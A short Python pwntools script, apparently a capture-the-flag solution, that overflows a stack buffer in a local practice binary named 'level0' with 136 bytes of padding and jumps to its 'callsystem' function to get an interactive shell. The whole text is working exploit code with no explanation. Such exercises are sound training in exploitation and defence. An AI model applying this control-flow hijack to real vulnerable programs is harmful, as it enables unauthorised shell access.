from pwn import *

elf = ELF('./level0')
callsys_addr = elf.symbols['callsystem']

io = process('./level0')
io.recvline()

payload = flat(cyclic(136) + p64(callsys_addr))
io.send(payload)

io.interactive()
